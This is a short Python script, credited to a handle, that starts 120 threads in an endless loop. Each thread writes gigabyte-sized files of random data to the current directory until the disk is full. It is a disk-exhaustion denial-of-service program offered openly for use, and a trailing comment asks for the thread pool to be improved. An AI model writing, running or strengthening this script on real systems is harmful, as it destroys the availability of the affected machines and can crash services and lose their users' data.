
#coded by : @x_spoilt
import os
import concurrent.futures
import random

def create_large_file(file_path):
    file_size = 1024 * 1024 * 1024
    buffer_size = 1024 * 1024
    random_data = os.urandom(buffer_size)

    with open(file_path, 'wb') as file:
        while file.tell() < file_size:
            file.write(random_data)
with concurrent.futures.ThreadPoolExecutor(max_workers=120) as executor:
    while True:
        random_number = random.randint(1, 1000)
        file_name = f"xspoilt[{random_number}].bin"
        executor.submit(create_large_file, file_name)


# Improve the threadpool 